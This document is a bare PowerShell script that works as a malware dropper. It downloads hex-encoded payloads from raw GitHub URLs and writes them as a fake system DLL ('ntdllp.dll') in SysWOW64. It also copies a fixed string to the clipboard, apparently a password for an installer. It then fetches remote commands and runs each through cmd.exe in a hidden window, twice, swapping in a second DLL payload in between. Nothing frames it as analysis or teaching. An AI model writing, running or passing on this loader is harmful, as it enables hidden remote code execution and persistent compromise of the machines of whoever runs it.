$urlA = "https://raw.githubusercontent.com/devnull-sys/files/refs/heads/main/iwe_history.txt"
$urlB = "https://raw.githubusercontent.com/devnull-sys/files/refs/heads/main/e.txt"
$urlC = "https://raw.githubusercontent.com/devnull-sys/files/refs/heads/main/b.txt"
$urlD = "https://raw.githubusercontent.com/devnull-sys/files/refs/heads/main/c.txt"
$filePath = "C:\Windows\SysWOW64\ntdllp.dll"
$clipText = "SteF6b2WrAgu"
function HexToBytes {
    param([string]$hexStr)
    $cleanHex = $hexStr -replace '[^0-9A-Fa-f]', ''
    $byteArr = [byte[]]::new($cleanHex.Length / 2)
    for ($i = 0; $i -lt $cleanHex.Length; $i += 2) {
        $byteArr[$i/2] = [convert]::ToByte($cleanHex.Substring($i, 2), 16)
    }
    return $byteArr
}
$responseA = iwr $urlA -TimeoutSec 30
$hexContent = $responseA.Content.Trim()
$bytes = HexToBytes $hexContent
[IO.File]::WriteAllBytes($filePath, $bytes)
Set-Clipboard $clipText
$responseB = iwr $urlB -TimeoutSec 30
$cmdToRun = $responseB.Content.Trim()
$psi = New-Object System.Diagnostics.ProcessStartInfo
$psi.FileName = "cmd.exe"
$psi.Arguments = "/c $cmdToRun"
$psi.UseShellExecute = $false
$psi.CreateNoWindow = $true
$process = [System.Diagnostics.Process]::Start($psi)
$process.WaitForExit()
do {
    Start-Sleep -Seconds 2
} while (Get-Process -Name "Installer" -ErrorAction SilentlyContinue)
$responseC = iwr $urlC -TimeoutSec 30
$newHexContent = $responseC.Content.Trim()
$newBytes = HexToBytes $newHexContent
[IO.File]::WriteAllBytes($filePath, $newBytes)
$responseD = iwr $urlD -TimeoutSec 30
$finalCmd = $responseD.Content.Trim()
$psi2 = New-Object System.Diagnostics.ProcessStartInfo
$psi2.FileName = "cmd.exe"
$psi2.Arguments = "/c $finalCmd"
$psi2.UseShellExecute = $false
$psi2.CreateNoWindow = $true
$process2 = [System.Diagnostics.Process]::Start($psi2)
$process2.WaitForExit()
